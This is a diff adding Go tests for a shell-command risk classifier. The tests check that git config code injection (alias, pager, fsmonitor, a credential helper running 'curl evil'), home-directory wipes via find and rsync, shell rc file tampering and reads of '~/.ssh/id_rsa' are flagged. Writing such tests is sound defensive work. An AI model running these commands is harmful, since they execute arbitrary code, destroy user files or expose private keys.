@@ -715,6 +715,97 @@ func TestClassify_RsyncRemote(t *testing.T) {
 	}
 }
 
+// TestClassify_GitConfigCodeExecution verifies H-1: git -c/--config-env and
+// git config can inject arbitrary shell commands through aliases, pager, and
+// credential helpers, so they must classify as code_execution.
+func TestClassify_GitConfigCodeExecution(t *testing.T) {
+	tests := []struct {
+		cmd  string
+		want RiskClass
+	}{
+		{`git -c alias.x='!id' x`, CodeExecution},
+		{`git -c alias.x=!id x`, CodeExecution},
+		{`git -calias.x=!id x`, CodeExecution},
+		{`git -c core.pager='sh -c id' --paginate log`, CodeExecution},
+		{`git -c core.fsmonitor='!pwn' status`, CodeExecution},
+		{`git -c credential.helper='!curl evil' clone`, CodeExecution},
+		{`git config --global alias.pwn '!cmd'`, CodeExecution},
+		{`git config user.email x`, CodeExecution},
+		// Benign config overrides stay in their normal class.
+		{`git -c http.proxy=http://evil fetch origin`, NetworkEgress},
+		{`git -C /repo status`, Safe},
+		{`git status`, Safe},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.want {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.want)
+			}
+		})
+	}
+}
+
+// TestClassify_FindRsyncDestructive verifies H-2: find -delete and rsync
+// --delete / --remove-source-files can wipe directory trees, so they are
+// destructive; find -fprint/-fprintf are local writes.
+func TestClassify_FindRsyncDestructive(t *testing.T) {
+	tests := []struct {
+		cmd  string
+		want RiskClass
+	}{
+		{"find . -delete", Destructive},
+		{"find ~ -delete", Destructive},
+		{"find . -fprint ~/.bashrc", LocalWrite},
+		{"find . -fprintf /tmp/list '%p\\n'", LocalWrite},
+		{"rsync -a --delete /tmp/empty/ ~", Destructive},
+		{"rsync -av --remove-source-files /a /b", Destructive},
+		{"rsync -av --del /a /b", Destructive},
+		{"rsync -av /src/ /dst/", Safe},
+		{"rsync -av /src/ user@host:/dst/", NetworkEgress},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.want {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.want)
+			}
+		})
+	}
+}
+
+// TestClassify_ShellRCTargets verifies H-3: shell writes to shell rc files
+// and other home-sensitive paths are escalated to system_write using the same
+// ClassifyPath lists that gate the file tools.
+func TestClassify_ShellRCTargets(t *testing.T) {
+	tests := []struct {
+		cmd  string
+		want RiskClass
+	}{
+		{"echo x >> ~/.bashrc", SystemWrite},
+		{"echo x >> ~/.zshrc", SystemWrite},
+		{"echo x >> ~/.profile", SystemWrite},
+		{"echo x >> $HOME/.bashrc", SystemWrite},
+		{"cp evil ~/.profile", SystemWrite},
+		{"tee -a ~/.zshrc", SystemWrite},
+		{"dd if=evil of=~/.bashrc", SystemWrite},
+		{"cat ~/.bashrc", SystemWrite},
+		{"cat ~/.ssh/id_rsa", SystemWrite},
+		{"cat ~/.odek/config.json", SystemWrite},
+		// Non-rc home paths stay local_write.
+		{"mv evil ~/.local/bin/git", LocalWrite},
+		{"echo x > ~/notes.txt", LocalWrite},
+	}
+	for _, tt := range tests {
+		t.Run(tt.cmd, func(t *testing.T) {
+			got := Classify(tt.cmd)
+			if got != tt.want {
+				t.Errorf("Classify(%q) = %s, want %s", tt.cmd, got, tt.want)
+			}
+		})
+	}
+}
+
 func TestClassify_PythonDashC(t *testing.T) {
 	got := Classify("python -c 'print(1)'")
 	if got != CodeExecution {
